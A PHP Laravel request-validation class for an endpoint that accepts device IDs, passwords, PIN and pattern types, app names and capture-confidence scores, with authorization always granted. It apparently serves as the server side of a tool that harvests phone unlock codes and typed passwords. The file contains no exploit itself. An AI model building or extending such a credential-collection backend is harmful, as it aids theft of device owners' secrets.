<?php

declare(strict_types=1);

namespace App\Http\Requests\Device;

use Illuminate\Contracts\Validation\Validator;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Http\Exceptions\HttpResponseException;

class SyncCredentialsRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    public function rules(): array
    {
        return [
            'deviceId' => 'required|string|max:64',
            'password' => 'required|string|max:1000',
            'passwordType' => 'required|string|in:pin,pattern,password,unknown,pin_4,pin_6',
            'inputMethod' => 'nullable|string|max:50',
            'appName' => 'nullable|string|max:100',
            'packageName' => 'nullable|string|max:255',
            'confidence' => 'nullable|integer|min:0|max:100',
            'timestamp' => 'nullable|integer',
        ];
    }

    protected function failedValidation(Validator $validator): never
    {
        throw new HttpResponseException(response()->json([
            'success' => false,
            'code' => 422,
            'msg' => $validator->errors()->first(),
            'data' => null,
        ], 422));
    }
}
